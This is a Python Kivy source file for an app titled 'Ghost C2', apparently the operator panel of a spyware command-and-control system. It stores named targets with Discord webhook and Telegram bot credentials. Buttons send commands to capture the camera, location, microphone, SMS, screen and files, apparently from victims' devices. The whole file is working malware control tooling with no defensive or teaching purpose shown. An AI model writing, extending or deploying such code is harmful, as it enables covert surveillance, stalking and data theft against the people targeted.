from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.uix.label import Label
from kivy.uix.popup import Popup
from kivy.uix.scrollview import ScrollView
from kivy.uix.gridlayout import GridLayout
from kivy.storage.jsonstore import JsonStore
from kivy.clock import Clock
from kivy.graphics import Color, Rectangle
from kivy.core.window import Window
import requests
import threading
from datetime import datetime
import time
import random

class GhostApp(App):
    def build(self):
        self.store = JsonStore('ghost_clean.json')
        self.title = "Ghost C2"
        self.current_target_index = 0
        self.monitoring_active = False
        self.custom_buttons = []

        if self.store.exists('targets'):
            self.targets = self.store.get('targets')['list']
        else:
            self.targets = [{'name': 'Target1', 'webhook': '', 'tg_token': '', 'tg_chat': ''}]
            self.store.put('targets', list=self.targets)

        self.main_layout = BoxLayout(orientation='vertical', padding=10, spacing=8)
        with self.main_layout.canvas.before:
            Color(0.05, 0.05, 0.1, 1)
            self.rect = Rectangle(size=Window.size, pos=(0,0))
        Window.bind(on_resize=self._update_rect)

        self._build_ui()
        return self.main_layout

    def _update_rect(self, *args):
        self.rect.size = Window.size

    def _build_ui(self):
        top = BoxLayout(size_hint_y=None, height=45, spacing=5)
        self.target_btn = Button(text=f"Target: {self.targets[0]['name']}", background_color=(0.1,0.2,0.4,1))
        self.target_btn.bind(on_press=self.cycle_target)
        add_btn = Button(text="+", size_hint_x=None, width=45, background_color=(0,0.5,0,1))
        add_btn.bind(on_press=self.add_target_popup)
        test_btn = Button(text="Test", size_hint_x=None, width=45, background_color=(0.2,0.5,0.8,1))
        test_btn.bind(on_press=self.test_channels)
        clear_btn = Button(text="Clear", size_hint_x=None, width=50, background_color=(0.7,0.2,0.2,1))
        clear_btn.bind(on_press=lambda x: self.log_view.clear_widgets())
        top.add_widget(self.target_btn)
        top.add_widget(add_btn)
        top.add_widget(test_btn)
        top.add_widget(clear_btn)
        self.main_layout.add_widget(top)

        self.in_webhook = TextInput(hint_text="Discord Webhook", password=True, size_hint_y=None, height=38)
        self.in_token = TextInput(hint_text="Telegram Token", password=True, size_hint_y=None, height=38)
        self.in_chat = TextInput(hint_text="Telegram Chat ID", size_hint_y=None, height=38)
        t = self.targets[self.current_target_index]
        self.in_webhook.text = t.get('webhook', '')
        self.in_token.text = t.get('tg_token', '')
        self.in_chat.text = t.get('tg_chat', '')
        for w in [self.in_webhook, self.in_token, self.in_chat]:
            w.bind(text=self.sync_target)
            self.main_layout.add_widget(w)

        grid = GridLayout(cols=3, spacing=5, size_hint_y=None, height=110)
        for name, code in [("CAM", "SNAP"), ("GPS", "LOC"), ("MIC", "REC"),
                           ("SMS", "MSG"), ("SCREEN", "SS"), ("FILE", "LS")]:
            btn = Button(text=name, font_size='12sp', background_color=(0.1,0.3,0.3,1))
            btn.bind(on_press=lambda x, c=code: self.dispatch(c))
            grid.add_widget(btn)
        self.main_layout.add_widget(grid)

        self.log_view = GridLayout(cols=1, size_hint_y=None, spacing=2)
        self.log_view.bind(minimum_height=self.log_view.setter('height'))
        scroll = ScrollView()
        scroll.add_widget(self.log_view)
        self.main_layout.add_widget(scroll)

    def cycle_target(self, *args):
        self.current_target_index = (self.current_target_index + 1) % len(self.targets)
        t = self.targets[self.current_target_index]
        self.in_webhook.text = t.get('webhook', '')
        self.in_token.text = t.get('tg_token', '')
        self.in_chat.text = t.get('tg_chat', '')
        self.target_btn.text = f"Target: {t['name']}"
        self.add_log(f"Switched to {t['name']}")

    def sync_target(self, *args):
        t = self.targets[self.current_target_index]
        t['webhook'] = self.in_webhook.text
        t['tg_token'] = self.in_token.text
        t['tg_chat'] = self.in_chat.text
        self.store.put('targets', list=self.targets)

    def add_target_popup(self, instance):
        content = BoxLayout(orientation='vertical', padding=10, spacing=10)
        name_input = TextInput(hint_text="Target Name", multiline=False)
        btn = Button(text="Add", background_color=(0,0.6,0.3,1))
        content.add_widget(name_input)
        content.add_widget(btn)
        popup = Popup(title="New Target", content=content, size_hint=(0.7,0.3))
        btn.bind(on_press=lambda x: self._add_target(name_input.text, popup))
        popup.open()

    def _add_target(self, name, popup):
        if name.strip():
            self.targets.append({'name': name, 'webhook': '', 'tg_token': '', 'tg_chat': ''})
            self.store.put('targets', list=self.targets)
            self.add_log(f"Target '{name}' added")
            popup.dismiss()
        else:
            self.add_log("Name required!", True)

    def test_channels(self, instance):
        def _test():
            ds_ok = False
            if self.in_webhook.text:
                try:
                    r = requests.post(self.in_webhook.text, json={"content": "PING"}, timeout=5)
                    ds_ok = r.status_code < 300
                except: pass
            tg_ok = False
            if self.in_token.text and self.in_chat.text:
                try:
                    url = f"https://api.telegram.org/bot{self.in_token.text}/sendMessage"
                    r = requests.post(url, json={"chat_id": self.in_chat.text, "text": "PING"}, timeout=5)
                    tg_ok = r.status_code == 200
                except: pass
            Clock.schedule_once(lambda dt: self.add_log(f"Discord: {'OK' if ds_ok else 'FAIL'} | Telegram: {'OK' if tg_ok else 'FAIL'}"))
        threading.Thread(target=_test).start()

    def dispatch(self, cmd):
        if not cmd.strip():
            return
        has_discord = bool(self.in_webhook.text.strip())
        has_telegram = bool(self.in_token.text.strip() and self.in_chat.text.strip())
        if not (has_discord or has_telegram):
            self.add_log("No active channel!", True)
            return

        cmd_id = str(random.randint(1000, 9999))
        self.add_log_entry(cmd, cmd_id)
        final_msg = f"CMD:{cmd_id}|{cmd}"

        def send_proc():
            success = False
            if has_discord:
                try:
                    requests.post(self.in_webhook.text, json={"content": final_msg}, timeout=8)
                    success = True
                except: pass
            if has_telegram:
                try:
                    url = f"https://api.telegram.org/bot{self.in_token.text}/sendMessage"
                    requests.post(url, json={"chat_id": self.in_chat.text, "text": final_msg}, timeout=8)
                    success = True
                except: pass
            if success:
                Clock.schedule_once(lambda dt: self.add_log(f"Sent: {cmd} (ID:{cmd_id})"))
            else:
                Clock.schedule_once(lambda dt: self.add_log(f"Failed: {cmd}", True))
        threading.Thread(target=send_proc).start()

    def add_log_entry(self, cmd, cmd_id):
        lbl = Label(text=f"[{datetime.now().strftime('%H:%M:%S')}] Sending: {cmd} (ID:{cmd_id})",
                    size_hint_y=None, height=22, font_size='11sp', color=(0.7,0.7,0.7,1))
        self.log_view.add_widget(lbl, index=0)

    def add_log(self, msg, is_error=False):
        if len(self.log_view.children) > 30:
            self.log_view.remove_widget(self.log_view.children[-1])
        color = (1,0.4,0.4,1) if is_error else (0.4,1,0.6,1)
        lbl = Label(text=f"[{datetime.now().strftime('%H:%M:%S')}] {msg}",
                    size_hint_y=None, height=22, font_size='11sp', color=color)
        self.log_view.add_widget(lbl, index=0)

if __name__ == '__main__':
    GhostApp().run()
